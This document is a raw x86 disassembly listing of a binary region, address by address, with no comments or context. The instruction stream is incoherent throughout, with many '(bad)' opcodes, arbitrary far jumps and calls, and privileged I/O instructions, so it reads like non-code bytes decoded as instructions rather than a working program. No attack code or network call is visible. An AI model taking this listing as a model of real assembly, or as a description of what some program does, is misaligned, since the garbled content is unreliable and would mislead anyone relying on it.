  421fc7:	(bad)  
  421fc8:	cmp    BYTE PTR [ebp-0x17ba6762],bh
  421fce:	dec    ebp
  421fcf:	xchg   BYTE PTR [ebx],ah
  421fd1:	adc    al,0x3a
  421fd3:	inc    eax
  421fd4:	rcl    DWORD PTR [ebx],0x92
  421fd7:	mov    edx,0x70f8b98e
  421fdc:	stc    
  421fdd:	mov    ecx,0xcaa77c3
  421fe2:	xchg   esi,edx
  421fe4:	arpl   WORD PTR [ebp+0x18e4318b],bp
  421fea:	sub    esp,DWORD PTR [esi+0x38e2dcfd]
  421ff0:	cmp    ecx,esi
  421ff2:	aas    
  421ff3:	outs   dx,DWORD PTR ds:[esi]
  421ff4:	cld    
  421ff5:	sbb    edi,DWORD PTR [eax-0x4a]
  421ff8:	inc    esi
  421ff9:	test   edi,esp
  421ffb:	pop    edx
  421ffc:	cli    
  421ffd:	jg     0x421fa4
  421fff:	pop    es
  422000:	jl     0x421f84
  422002:	pop    esi
  422003:	shl    ah,0xeb
  422006:	pop    ds
  422007:	mov    ecx,0xd206e14
  42200c:	jo     0x422059
  42200e:	inc    eax
  42200f:	xor    eax,0xfaee8b0d
  422014:	dec    esp
  422015:	test   BYTE PTR [ebp+0x7333108],bh
  42201b:	nop
  42201c:	ds int3 
  42201e:	jp     0x42204d
  422020:	and    al,0x84
  422022:	sub    DWORD PTR [ecx],eax
  422024:	(bad)  
  422025:	pushf  
  422026:	sbb    ebx,DWORD PTR [ecx-0x7]
  422029:	loope  0x421fc2
  42202b:	not    DWORD PTR [ecx+edi*2-0x771d8542]
  422032:	sbb    eax,0xefbf7ec3
  422037:	jg     0x422020
  422039:	inc    DWORD PTR [ecx]
  42203b:	test   DWORD PTR [eax-0x2],ebx
  42203e:	adc    eax,0x58b36a8f
  422043:	ins    DWORD PTR es:[edi],dx
  422044:	xor    DWORD PTR [ebx+edi*2],ebp
  422047:	mov    ebp,0x47c6bd80
  42204c:	not    eax
  42204e:	mov    dh,0xbf
  422050:	cwde   
  422051:	xor    BYTE PTR [eax+0x668186ee],al
  422057:	das    
  422058:	inc    eax
  422059:	out    0xbb,al
  42205b:	add    al,0x1c
  42205d:	adc    eax,0xf9a08f5a
  422062:	dec    esp
  422063:	pop    esp
  422064:	xchg   dl,ah
  422066:	jnp    0x42206b
  422068:	xchg   edi,eax
  422069:	in     al,dx
  42206a:	mov    DWORD PTR [eax+eiz*2-0x7a2fd709],esi
  422071:	dec    esp
  422072:	pop    ecx
  422073:	xchg   esp,eax
  422074:	cs pusha 
  422076:	mov    cl,0x83
  422078:	pop    ds
  422079:	ret    0x626e
  42207c:	loopne 0x422022
  42207e:	add    DWORD PTR [ebx],ecx
  422080:	lods   al,BYTE PTR fs:[esi]
  422082:	or     eax,0x7d44e068
  422087:	jmp    0xb4c8:0x56167ae0
  42208e:	jae    0x42207d
  422090:	add    DWORD PTR [edx+0x68],ecx
  422093:	xor    BYTE PTR ds:0xae40fc6e,bh
  422099:	les    eax,FWORD PTR [eax-0x661db17]
  42209f:	imul   ebp,DWORD PTR [ecx+0x50],0x5084645
  4220a6:	cli    
  4220a7:	fs dec esi
  4220a9:	or     eax,DWORD PTR [ecx+ebx*8-0x50]
  4220ad:	hlt    
  4220ae:	mov    BYTE PTR [eax+0x24],cl
  4220b1:	cmp    esp,DWORD PTR [esp+eiz*2-0x3b]
	...
  422115:	add    BYTE PTR [esi-0x284ae],ah
  42211b:	std    
  42211c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42211d:	pop    ebx
  42211e:	or     ebx,ebp
  422120:	retf   0xfc5c
  422123:	mov    al,0x98
  422125:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422126:	push   cs
  422127:	push   0x1
  422129:	add    BYTE PTR [edi],al
  42212b:	add    DWORD PTR [eax],eax
  42212d:	add    BYTE PTR [edx-0x70],ah
  422130:	fiadd  WORD PTR [ebx]
  422132:	retf   0x25df
  422135:	test   eax,0x7db449d
  42213a:	xlat   BYTE PTR ds:[ebx]
  42213b:	cmp    al,0xd9
  42213d:	mov    eax,0xb05d786b
  422142:	aad    0x80
  422144:	push   edi
  422145:	ja     0x422181
  422147:	hlt    
  422148:	mov    dl,0x3c
  42214a:	push   0x42
  42214c:	leave  
  42214d:	fadd   DWORD PTR ds:0x3efbd7cd
  422153:	stos   DWORD PTR es:[edi],eax
  422154:	shl    edx,cl
  422156:	xchg   edi,eax
  422157:	xchg   esi,eax
  422158:	fimul  WORD PTR [eax+0x5e472df7]
  42215e:	push   0xe6b43983
  422163:	mov    edx,0xe5bd74f0
  422168:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422169:	mov    ch,0xf4
  42216b:	xor    edx,ebp
  42216d:	lea    edi,[eax-0x6f827e0e]
  422173:	jl     0x4221bb
  422175:	pop    ss
  422176:	or     eax,0x2ccd2ade
  42217b:	leave  
  42217c:	out    0xc,al
  42217e:	idiv   BYTE PTR [ebx]
  422180:	cmp    al,0x66
  422182:	aad    0x0
  422184:	(bad)  
  422185:	aas    
  422186:	dec    ebp
  422187:	jbe    0x422138
  422189:	leave  
  42218a:	fldenv [ebp+0x3d]
  42218d:	xor    BYTE PTR [esi+0x79],ah
  422190:	mov    dl,0xc1
  422192:	mov    ecx,0x2a337f02
  422197:	xor    eax,0xdda0eb0a
  42219c:	das    
  42219d:	sar    dl,cl
  42219f:	jmp    0x9e3697a5
  4221a4:	in     al,0xf6
  4221a6:	int3   
  4221a7:	sahf   
  4221a8:	sti    
  4221a9:	pop    edx
  4221aa:	test   DWORD PTR [ecx-0x61],esi
  4221ad:	lds    edi,FWORD PTR [edi]
  4221af:	add    bl,BYTE PTR [edi+0x1]
  4221b2:	mov    esi,0x1b52f269
  4221b7:	call   0x4588:0xbcaeb4d7
  4221be:	jg     0x422145
  4221c0:	ins    DWORD PTR es:[edi],dx
  4221c1:	pop    eax
  4221c2:	sub    DWORD PTR [ebx-0x2b],edx
  4221c5:	jno    0x422240
  4221c7:	ss out 0xe3,al
  4221ca:	mov    ch,0x5a
  4221cc:	or     eax,0x6ed8936
  4221d1:	lock sbb DWORD PTR [ebx+0x43b020e9],esp
  4221d8:	inc    ebx
  4221d9:	(bad)  
  4221da:	call   0xca01d024
  4221df:	push   ecx
  4221e0:	inc    edi
  4221e1:	mov    bl,0x1f
  4221e3:	jbe    0x422236
  4221e5:	xchg   edx,eax
  4221e6:	xchg   BYTE PTR [edi+0x0],cl
  4221e9:	mov    al,ds:0x2cf9d2c6
  4221ee:	pushf  
  4221ef:	mov    ds:0xdf3416f6,eax
  4221f4:	mov    ecx,0xa9846ded
  4221f9:	sbb    bh,BYTE PTR [edx+ebx*2+0xe79a6ff]
  422200:	int    0x5e
  422202:	mov    bl,0x49
  422204:	cmp    DWORD PTR [ebp+0x79],0x4
  422208:	das    
  422209:	jg     0x4221a5
  42220b:	mov    edi,0x51c02f11
  422210:	add    eax,0x3dd4bf63
  422215:	sub    eax,DWORD PTR [esi+0x6e]
  422218:	hlt    
  422219:	jno    0x422273
  42221b:	outs   dx,BYTE PTR ds:[esi]
  42221c:	mov    BYTE PTR [edi+0x4f700602],ah
  422222:	loopne 0x422279
  422224:	loope  0x4221b9
  422226:	fcom   DWORD PTR [edx+0x6d1a6b40]
  42222c:	pop    edx
  42222d:	bound  ebp,QWORD PTR [ecx]
  42222f:	leave  
  422230:	ror    BYTE PTR [edi-0x6f],1
  422233:	xchg   esp,eax
  422234:	test   BYTE PTR [eax],0x0
	...
  422293:	add    BYTE PTR [eax],al
  422295:	add    BYTE PTR [edi-0x10085213],cl
  42229b:	neg    edi
  42229d:	std    
  42229e:	fsubr  DWORD PTR [edi-0x12]
  4222a1:	adc    edi,DWORD PTR [edx]
  4222a3:	dec    eax
  4222a4:	cmp    edi,DWORD PTR [eax+0x16b15]
  4222aa:	pop    es
  4222ab:	add    DWORD PTR [eax],eax
  4222ad:	add    al,ah
  4222af:	cmp    BYTE PTR [esi+0x1e],bl
  4222b2:	sti    
  4222b3:	mov    bh,0xcf
  4222b5:	pop    ebp
  4222b6:	cld    
  4222b7:	fs popa 
  4222b9:	adc    DWORD PTR [ebp+0x72],eax
  4222bc:	hlt    
  4222bd:	shl    DWORD PTR [edx-0x1c],cl
  4222c0:	lods   eax,DWORD PTR ds:[esi]
  4222c1:	pop    edx
  4222c2:	add    al,BYTE PTR gs:[eax-0x3d64f616]
  4222c9:	lahf   
  4222ca:	popa   
  4222cb:	scas   eax,DWORD PTR es:[edi]
  4222cc:	mov    dl,0x7c
  4222ce:	hlt    
  4222cf:	jp     0x422299
  4222d1:	inc    edx
  4222d2:	dec    ebp
  4222d3:	in     al,dx
  4222d4:	loopne 0x422325
  4222d6:	push   edx
  4222d7:	pushf  
  4222d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4222d9:	outs   dx,DWORD PTR ds:[esi]
  4222da:	jne    0x4222b0
  4222dc:	lahf   
  4222dd:	sbb    bl,BYTE PTR [edi-0x31a0d95d]
  4222e3:	mov    dh,0x8
  4222e5:	cmp    eax,0x7a43be7f
  4222ea:	adc    al,0xb9
  4222ec:	pop    esp
  4222ed:	push   0x91e9390e
  4222f2:	adc    eax,0x854c13a8
  4222f7:	mov    ecx,0x9dbde8da
  4222fc:	pop    eax
  4222fd:	dec    esi
  4222fe:	push   ds
  4222ff:	sub    eax,0x74cb7c2
  422304:	pop    esp
  422305:	push   ss
  422306:	fisub  WORD PTR [eax+0x75d11775]
  42230c:	sbb    BYTE PTR [edi-0x8],cl
  42230f:	pusha  
  422310:	scas   al,BYTE PTR es:[edi]
  422311:	call   0x31b3:0x9ad2341b
  422318:	add    DWORD PTR [esi],0x4f6b73da
  42231e:	sbb    ecx,ebp
  422320:	dec    ecx
  422321:	daa    
  422322:	call   FWORD PTR [ebx]
  422324:	stc    
  422325:	retf   
  422326:	or     DWORD PTR [esi-0x6d],esp
  422329:	rol    DWORD PTR [ebx],1
  42232b:	aam    0xf
  42232d:	(bad)  
  42232e:	adc    BYTE PTR [ebp+ebp*2-0x9f81893],bl
  422335:	or     al,0x37
  422337:	(bad)  
  422338:	std    
  422339:	mov    WORD PTR [ebx+0x19],?
  42233c:	icebp  
  42233d:	fadd   st,st(6)
  42233f:	sbb    eax,DWORD PTR [ebp+esi*8+0x77]
  422343:	sbb    al,0xf8
  422345:	add    al,0xf1
  422347:	jb     0x422392
  422349:	aad    0xcc
  42234b:	sub    al,0x8d
  42234d:	xor    BYTE PTR [edi-0x7fccfb21],dh
  422353:	pop    esp
  422354:	pop    ss
  422355:	fist   DWORD PTR [ecx]
  422357:	sbb    BYTE PTR [edx],0x85
  42235a:	cwde   
  42235b:	(bad)  
  42235c:	pusha  
  42235d:	push   es
  42235e:	push   esp
  42235f:	jnp    0x4223aa
  422361:	or     DWORD PTR [eax-0x2055cedd],esp
  422367:	mov    esp,DWORD PTR [ebx-0x5aaea032]
  42236d:	fistp  DWORD PTR [edi]
  42236f:	iret   
  422370:	retf   0xe906
  422373:	pop    esi
  422374:	(bad)  
  422375:	cmp    BYTE PTR [eax+0x57],bh
  422378:	scas   al,BYTE PTR es:[edi]
  422379:	les    edi,FWORD PTR [edi]
  42237b:	out    dx,eax
  42237c:	fbstp  TBYTE PTR [ecx+0x4d038286]
  422382:	sub    al,0xa5
  422384:	sub    dh,BYTE PTR [esi+0x3f]
  422387:	pop    ebx
  422388:	into   
  422389:	mov    eax,ds:0xad75444f
  42238e:	stos   BYTE PTR es:[edi],al
  42238f:	cmp    eax,0x1d9b180a
  422394:	cmp    eax,0xc5db02c1
  422399:	xchg   ecx,eax
  42239a:	imul   eax,DWORD PTR [ebx-0x225403a8],0xf648c77d
  4223a4:	mov    ebx,0xe00c6582
  4223a9:	call   0xf72f:0xe1b37b02
  4223b0:	push   ecx
  4223b1:	repz test DWORD PTR [esi+ecx*1],esi
	...
  422415:	add    BYTE PTR [edx-0x7e],dl
  422418:	cs imul edi,esi,0x88bb57ed
  42241f:	adc    eax,0x92ac65b6
  422424:	inc    ecx
  422425:	add    eax,0x16c1c
  42242a:	pop    es
  42242b:	add    DWORD PTR [eax],eax
  42242d:	add    BYTE PTR [eax-0x65],ch
  422430:	and    ecx,DWORD PTR [edi]
  422432:	add    BYTE PTR [esp+edx*1],bh
  422435:	loope  0x42243d
  422437:	ss je  0x4223d9
  42243a:	stc    
  42243b:	mov    esi,0x955739c3
  422440:	jbe    0x422491
  422442:	push   cs
  422443:	pushf  
  422444:	xor    eax,0xe05d1199
  422449:	and    al,0xfa
  42244b:	mov    ds:0x29d01d80,eax
  422450:	mov    ah,0xd
  422452:	out    0x52,eax
  422454:	scas   al,BYTE PTR es:[edi]
  422455:	xchg   esp,eax
  422456:	mov    al,ds:0x64553844
  42245b:	retf   0x33f9
  42245e:	pop    es
  42245f:	(bad)  [esi-0xf2f1d36]
  422465:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422466:	sub    edi,DWORD PTR [eax]
  422468:	jg     0x4224d0
  42246a:	add    bh,BYTE PTR [edi+edx*1]
  42246d:	pop    edi
  42246e:	pop    ebx
  42246f:	inc    ebp
  422470:	mov    ds:0x60f71693,eax
  422475:	push   edx
  422476:	inc    ecx
  422477:	call   0xd293c68
  42247c:	(bad)  
  42247d:	push   cs
  42247e:	cmp    eax,0xeece435f
  422483:	fwait
  422484:	cmp    DWORD PTR [eax+0x33fe050c],eax
  42248a:	or     DWORD PTR [esi+0x42],ebp
  42248d:	or     esp,DWORD PTR [esp+edi*1-0x4e]
  422491:	jp     0x422494
  422493:	mov    dl,0xdd
  422495:	xor    BYTE PTR [esp+esi*2+0x1e],cl
  422499:	je     0x422481
  42249b:	sub    DWORD PTR [edx],edi
  42249d:	cli    
  42249e:	mov    ah,0xfc
  4224a0:	sbb    DWORD PTR fs:[ebp+0xf],edx
  4224a4:	push   esp
  4224a5:	mov    WORD PTR [eax+0x4fcbd94d],?
  4224ab:	loope  0x42251e
  4224ad:	inc    eax
  4224ae:	dec    esi
  4224af:	ins    DWORD PTR es:[edi],dx
  4224b0:	jno    0x42244b
  4224b2:	and    DWORD PTR [esi-0x3f31cb13],0x11
  4224b9:	nop
  4224ba:	inc    esi
  4224bb:	and    al,0xaa
  4224bd:	mov    ah,0xe5
  4224bf:	cli    
  4224c0:	popa   
  4224c1:	daa    
  4224c2:	sub    eax,0x611e40d2
  4224c7:	add    eax,0x920e7ee9
  4224cc:	add    dh,0xac
  4224cf:	or     BYTE PTR [ebx-0x22812563],al
  4224d5:	inc    ecx
  4224d6:	jns    0x422505
  4224d8:	pop    esp
  4224d9:	dec    eax
  4224da:	xor    DWORD PTR [edi-0x4efab2e2],edx
  4224e0:	jmp    0xd63ddd4b
  4224e5:	xchg   edi,eax
  4224e6:	outs   dx,BYTE PTR ds:[esi]
  4224e7:	dec    eax
  4224e8:	fldcw  WORD PTR [eax+0x10]
  4224eb:	inc    eax
  4224ec:	(bad)  
  4224ed:	in     eax,dx
  4224ee:	dec    edi
  4224ef:	lods   eax,DWORD PTR ds:[esi]
  4224f0:	pushf  
  4224f1:	sbb    eax,0xd55b1668
  4224f6:	jl     0x42252f
  4224f8:	out    dx,eax
  4224f9:	aam    0x89
  4224fb:	lds    ebx,FWORD PTR [ebx+ebx*1-0x3320c2b8]
  422502:	out    0xae,eax
  422504:	pop    ebx
  422505:	dec    esi
  422506:	aas    
  422507:	jae    0x422504
  422509:	cmp    bl,BYTE PTR [esi-0x6a]
  42250c:	dec    ebp
  42250d:	ss pop edx
  42250f:	and    edx,edi
  422511:	jg     0x4224d6
  422513:	out    dx,eax
  422514:	pop    DWORD PTR [edx]
  422516:	(bad)  
  422517:	fsub   QWORD PTR [eax+0x20b7a30d]
  42251d:	sub    esp,DWORD PTR [ebx]
  42251f:	in     eax,dx
  422520:	xchg   DWORD PTR [edi-0xd],edi
  422523:	ret    0x2dcb
  422526:	push   edx
  422527:	fist   WORD PTR [edx-0x1b5069bc]
  42252d:	xchg   ebp,eax
  42252e:	in     al,0xd0
  422530:	rcl    ebp,1
  422532:	gs pop edi
  422534:	test   al,0x0
	...
  422596:	call   0xfa77:0xbf778fae
  42259d:	out    dx,eax
  42259e:	and    ebx,DWORD PTR [esi]
  4225a0:	outs   dx,DWORD PTR ds:[esi]
  4225a1:	fcomp  DWORD PTR [ebp+0x2363bf0e]
  4225a7:	ins    DWORD PTR es:[edi],dx
  4225a8:	add    DWORD PTR [eax],eax
  4225aa:	pop    es
  4225ab:	add    DWORD PTR [eax],eax
  4225ad:	add    BYTE PTR [esp+eiz*8],bh
  4225b0:	pop    edx
  4225b1:	mov    al,0x67
  4225b3:	xchg   ebp,eax
  4225b4:	fdiv   QWORD PTR [ebx+0x2e]
  4225b7:	adc    ecx,DWORD PTR [eax]
  4225b9:	pop    esp
  4225ba:	push   ss
  4225bb:	fldenv ds:0xa57b60e5
  4225c1:	test   eax,0x9f6febdc
  4225c6:	test   al,0x8d
  4225c8:	das    
  4225c9:	lahf   
  4225ca:	pop    eax
  4225cb:	mov    dl,al
  4225cd:	mov    bh,0x2b
  4225cf:	leave  
  4225d0:	call   0xb566a657
  4225d5:	pop    es
  4225d6:	imul   edi,ebx,0x5c
  4225d9:	in     al,dx
  4225da:	sub    BYTE PTR [esi-0x72d4f8df],bh
  4225e0:	lock lea esi,[eax]
  4225e3:	mov    esi,0xd452307f
  4225e8:	jmp    0x3f6fd2be
  4225ed:	and    ebp,ebx
  4225ef:	(bad)  
  4225f0:	stc    
  4225f1:	rol    DWORD PTR [esi],0xfd
  4225f4:	and    eax,0x88a207c2
  4225f9:	(bad)  
  4225fa:	outs   dx,DWORD PTR ds:[esi]
  4225fb:	mul    BYTE PTR [esi+0x3bfb0286]
  422601:	xor    BYTE PTR [ebx+0x41],bh
  422604:	push   ebx
  422605:	add    eax,0x19a5d730
  42260a:	cs push 0xae5ad32b
  422610:	and    cl,BYTE PTR [eax]
  422612:	push   cs
  422613:	iret   
  422614:	inc    ecx
  422615:	push   ebp
  422616:	lock pop eax
  422618:	sub    eax,0x3923c794
  42261d:	cmp    ch,al
  42261f:	std    
  422620:	int3   
  422621:	or     esp,DWORD PTR [ebp+ecx*2+0x17d361d8]
  422628:	jg     0x4225ab
  42262a:	imul   esi,DWORD PTR [esi+0x60],0xe757ce57
  422631:	dec    eax
  422632:	rcl    DWORD PTR [ecx],0xd4
  422635:	jns    0x422610
  422637:	stos   DWORD PTR es:[edi],eax
  422638:	popa   
  422639:	jge    0x42268c
  42263b:	mov    bh,0x7b
  42263d:	icebp  
  42263e:	es fwait
  422640:	jno    0x4225d6
  422642:	jp     0x422646
  422644:	enter  0xba46,0xdf
  422648:	push   edx
  422649:	mov    cl,0x74
  42264b:	adc    BYTE PTR [ebp+0xd7677f2],ch
  422651:	iret   
  422652:	and    al,0x75
  422654:	inc    esp
  422655:	jns    0x4225da
  422657:	int3   
  422658:	xor    eax,0x954337c4
  42265d:	jnp    0x422609
  42265f:	xchg   esi,eax
  422660:	out    0xe7,eax
  422662:	icebp  
  422663:	(bad)
  422666:	jmp    0x4226e6
  422668:	cdq    
  422669:	fs icebp 
  42266b:	ret    0x5ebc
  42266e:	or     DWORD PTR [edx-0x67],ebp
  422671:	inc    edx
  422672:	dec    esp
  422673:	cmp    BYTE PTR [eax+0x737fe1e7],dh
  422679:	scas   eax,DWORD PTR es:[edi]
  42267a:	xchg   DWORD PTR [ebx+0x4faa47d5],edx
  422680:	push   0x20
  422682:	enter  0x9904,0x5f
  422686:	in     eax,0xb0
  422688:	(bad)  [ebp+0x58]
  42268b:	push   es
  42268c:	les    eax,FWORD PTR [edx-0xe]
  42268f:	xchg   esp,eax
  422690:	push   edx
  422691:	jno    0x4226dc
  422693:	lds    edi,FWORD PTR ds:0x7f660c3
  422699:	sub    eax,0xdd97a7b3
  42269e:	shr    BYTE PTR cs:0x9bc8b0f1,0x75
  4226a6:	adc    BYTE PTR [ecx],cl
  4226a8:	mov    ecx,0x7462b43d
  4226ad:	rol    DWORD PTR [edi-0x2e007d68],1
  4226b3:	ins    DWORD PTR es:[edi],dx
  4226b4:	mov    esi,0x0
	...
  422715:	add    BYTE PTR [edi],ah
  422717:	sub    eax,0x7d7f2d7d
  42271c:	ja     0x42274d
  42271e:	aad    0x21
  422720:	add    al,0x2f
  422722:	jo     0x4226d8
  422724:	rol    DWORD PTR [ebx+0x2a],1
  422727:	outs   dx,BYTE PTR ds:[esi]
  422728:	add    DWORD PTR [eax],eax
  42272a:	pop    es
  42272b:	add    DWORD PTR [eax],eax
  42272d:	add    BYTE PTR [eax+0x12],dh
  422730:	mov    ecx,0xf9e8b728
  422735:	ret    
  422736:	adc    DWORD PTR [ebx-0x3b],edx
  422739:	mov    al,ds:0x914457df
  42273e:	ret    0xc6ab
  422741:	test   al,0x6a
  422743:	push   es
  422744:	gs xor eax,0x3165d044
  42274a:	adc    ch,cl
  42274c:	ror    esp,cl
  42274e:	sbb    BYTE PTR [esi+0x71],bl
  422751:	(bad)  
  422752:	aad    0x3
  422754:	lock inc esp
  422756:	and    eax,0xbc8599b0
  42275b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42275c:	das    
  42275d:	dec    ebp
  42275e:	inc    eax
  42275f:	push   ebx
  422760:	loop   0x4226f8
  422762:	jns    0x42273d
  422764:	(bad)  
  422765:	stc    
  422766:	loop   0x422757
  422768:	push   edi
  422769:	lods   eax,DWORD PTR ds:[esi]
  42276a:	cmp    dl,ah
  42276c:	cli    
  42276d:	pop    ds
  42276e:	jo     0x422722
  422770:	test   DWORD PTR [edi-0x59f26d30],edi
  422776:	adc    eax,DWORD PTR [ebp-0x56]
  422779:	and    cl,BYTE PTR [ecx+0x4a]
  42277c:	sar    DWORD PTR [ebp+0x5c89766],0xe3
  422783:	inc    edx
  422784:	pop    ebx
  422785:	test   eax,0xa2ac5b9d
  42278a:	int3   
  42278b:	ret    0xf954
  42278e:	dec    ecx
  42278f:	jecxz  0x4227e0
  422791:	mov    ch,0x13
  422793:	cmp    al,0x14
  422795:	adc    eax,0x50b09b0
  42279a:	pop    esp
  42279b:	cmp    eax,0xa4f652d9
  4227a0:	adc    DWORD PTR [ebx-0x29],esi
  4227a3:	cld    
  4227a4:	clc    
  4227a5:	arpl   WORD PTR [ebx-0x640760e],di
  4227ab:	xor    ah,bh
  4227ad:	(bad)  
  4227ae:	fmul   DWORD PTR [eax]
  4227b0:	or     DWORD PTR [edx-0x38f03d79],esi
  4227b6:	xchg   ebx,eax
  4227b7:	sub    esi,DWORD PTR [ebx+0x87583e4]
  4227bd:	repz mov dh,0x4a
  4227c0:	jmp    0x3af9:0x4bfb72f4
  4227c7:	outs   dx,DWORD PTR fs:[esi]
  4227c9:	or     ch,al
  4227cb:	adc    BYTE PTR [eax+edi*2],dh
  4227ce:	push   ebp
  4227cf:	fucomip st,st(5)
  4227d1:	int    0xd8
  4227d3:	and    DWORD PTR [edx],eax
  4227d5:	call   0x623e7861
  4227da:	cmp    cl,bh
  4227dc:	cli    
  4227dd:	xor    BYTE PTR [ebx+0x6b],0x52
  4227e1:	sub    DWORD PTR ds:[ebp-0x12a8d334],0xc1139722
  4227ec:	pop    es
  4227ed:	add    ch,BYTE PTR [ebx]
  4227ef:	xchg   edx,eax
  4227f0:	sti    
  4227f1:	sbb    dl,cl
  4227f3:	mov    WORD PTR [edi],fs
  4227f5:	fimul  DWORD PTR [edx-0x2db35e6f]
  4227fb:	test   BYTE PTR es:[ecx+0x4d],al
  4227ff:	cmp    esi,DWORD PTR [ecx-0x29e5de2f]
  422805:	push   ecx
  422806:	in     eax,0x72
  422808:	lahf   
  422809:	outs   dx,BYTE PTR ds:[esi]
  42280a:	out    dx,eax
  42280b:	mov    al,ds:0x2e8e0ebe
  422810:	mov    al,ds:0xf152f2cf
  422815:	pop    es
  422816:	in     eax,0x3a
  422818:	out    0x1e,al
  42281a:	jle    0x4227f3
  42281c:	sub    dl,BYTE PTR ds:0xd5ec8923
  422822:	mov    esi,0xe9e0ac3f
  422827:	push   ecx
  422828:	jle    0x42280b
  42282a:	xor    ch,bl
  42282c:	retf   
  42282d:	pop    ecx
  42282e:	push   edi
  42282f:	into   
  422830:	cmp    bh,cl
  422832:	adc    BYTE PTR [edi],bh
  422834:	cmp    al,0x0
	...
  422896:	int    0x39
  422898:	mov    eax,0xef97fc97
  42289d:	jnp    0x42284b
  42289f:	inc    ebx
  4228a0:	cmp    bl,BYTE PTR [esp+eiz*2]
  4228a3:	jb     0x4228a3
  4228a5:	mov    ds:0x16f31,eax
  4228aa:	pop    es
  4228ab:	add    DWORD PTR [eax],eax
  4228ad:	add    BYTE PTR [edi],cl
  4228af:	js     0x4228d1
  4228b1:	sbb    ecx,DWORD PTR [esi]
  4228b3:	mov    DWORD PTR [edi+0x50],eax
  4228b6:	test   DWORD PTR [ebx-0xae49a3b],0xd2ba089e
  4228c0:	sbb    cl,BYTE PTR ds:[ebx-0x3c]
  4228c4:	sbb    edi,DWORD PTR [edx-0x385adad2]
  4228ca:	out    0xa7,al
  4228cc:	arpl   WORD PTR [ebp-0x51],sp
  4228cf:	neg    ecx
  4228d1:	(bad)  
  4228d2:	in     eax,dx
  4228d3:	sub    esp,DWORD PTR [esi-0x30faa421]
  4228d9:	bound  ecx,QWORD PTR [ecx-0x2]
  4228dc:	cmp    al,0xd1
  4228de:	scas   eax,DWORD PTR es:[edi]
  4228df:	mov    al,BYTE PTR [esi+0x764ebc98]
  4228e5:	xlat   BYTE PTR ds:[ebx]
  4228e6:	xchg   ecx,eax
  4228e7:	clc    
  4228e8:	pop    ss
  4228e9:	adc    DWORD PTR [edi+ebx*4-0x3e6f7990],esp
  4228f0:	addps  xmm0,XMMWORD PTR [ebp-0x198396e9]
  4228f7:	fwait
  4228f8:	jne    0x422903
  4228fa:	jne    0x4228e4
  4228fc:	mov    edx,0xc8fa51ca
  422901:	pop    esi
  422902:	cmc    
  422903:	imul   edi,DWORD PTR [edi-0x79],0x45
  422907:	test   DWORD PTR [ecx-0x51],esi
  42290a:	pop    edi
  42290b:	into   
  42290c:	ins    BYTE PTR es:[edi],dx
  42290d:	pop    edx
  42290e:	(bad)  
  42290f:	rol    DWORD PTR [ebx],cl
  422911:	mov    edi,0x1a1a1317
  422916:	(bad)  
  422917:	icebp  
  422918:	and    BYTE PTR [ebx-0x2d],ah
  42291b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42291c:	push   ebx
  42291d:	inc    ebx
  42291e:	xor    al,0x49
  422920:	lahf   
  422921:	dec    edx
  422922:	std    
  422923:	sbb    al,0xe8
  422925:	cli    
  422926:	mov    BYTE PTR [edi+0x4a],bl
  422929:	aad    0x1e
  42292b:	(bad)  
  42292d:	mov    BYTE PTR [ecx+0x1f802ecb],ah
  422933:	(bad)  
  422935:	add    esi,esp
  422937:	mov    ch,0xff
  422939:	xor    al,0xa7
  42293b:	(bad)  
  42293c:	loope  0x422940
  42293e:	sub    edx,DWORD PTR [ebx+0x13]
  422941:	cs sbb eax,0xc3d3ecb
  422947:	sbb    edi,DWORD PTR [eax-0x7f]
  42294a:	hlt    
  42294b:	(bad)  
  42294c:	icebp  
  42294d:	push   ebx
  42294e:	repz lahf 
  422950:	dec    ecx
  422951:	adc    ah,ah
  422953:	retf   0xa9f6
  422956:	inc    esp
  422957:	and    esi,DWORD PTR [edi+0x58774c7a]
  42295d:	sub    ecx,edx
  42295f:	out    0x47,al
  422961:	mov    esp,0xdc0bda44
  422966:	nop
  422967:	aaa    
  422968:	mov    ecx,DWORD PTR [ebp+0x11876586]
  42296e:	data16 jg 0x422952
  422971:	in     eax,dx
  422972:	push   es
  422973:	ins    DWORD PTR es:[edi],dx
  422974:	neg    DWORD PTR [ecx-0x7c772dbf]
  42297a:	dec    esp
  42297b:	xchg   BYTE PTR [ebx+ecx*8-0x23],ch
  42297f:	pop    eax
  422980:	pop    ecx
  422981:	cmp    al,0x1b
  422983:	sub    dh,bl
  422985:	cli    
  422986:	lods   al,BYTE PTR ds:[esi]
  422987:	add    DWORD PTR ds:0xe8c7f3c5,0xc26d7608
  422991:	sub    al,0xa5
  422993:	das    
  422994:	cmp    DWORD PTR [eax],esi
  422996:	and    BYTE PTR [esi+0x24056797],al
  42299c:	outs   dx,DWORD PTR ds:[esi]
  42299d:	fisttp WORD PTR [edi+ecx*8+0x5f52af72]
  4229a4:	jne    0x422985
  4229a6:	fisubr DWORD PTR [edx+0xe60aa66]
  4229ac:	or     ch,BYTE PTR [ecx+0x383e6c55]
  4229b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4229b3:	out    dx,eax
  4229b4:	xchg   ecx,eax
	...
  422a15:	add    BYTE PTR [esi-0x377e796],dl
  422a1b:	cli    
  422a1c:	xchg   esi,eax
  422a1d:	jle    0x422a63
  422a1f:	rol    ecx,1
  422a21:	call   0x79d741cf
  422a26:	cmp    BYTE PTR [eax+0x1],dh
  422a29:	add    BYTE PTR [edi],al
  422a2b:	add    DWORD PTR [eax],eax
  422a2d:	add    BYTE PTR [eax],dh
  422a2f:	jmp    0x4229d7
  422a31:	xchg   edi,eax
  422a32:	adc    eax,0x3f6e53c5
  422a37:	fiadd  DWORD PTR [ebp+0x65]
  422a3a:	test   eax,0x328fe31c
  422a3f:	sub    BYTE PTR [eax-0x43529b87],0x1e
  422a46:	sbb    eax,0x6009b1c5
  422a4b:	mov    esi,esp
  422a4d:	sbb    edi,DWORD PTR [ebx-0x71514da5]
  422a53:	dec    ebx
  422a54:	and    BYTE PTR [ebx-0x12ff0161],dh
  422a5a:	call   0x6dd9789c
  422a5f:	mov    esp,esi
  422a61:	int3   
  422a62:	addr16 and eax,0xb273747f
  422a68:	mov    ah,0x98
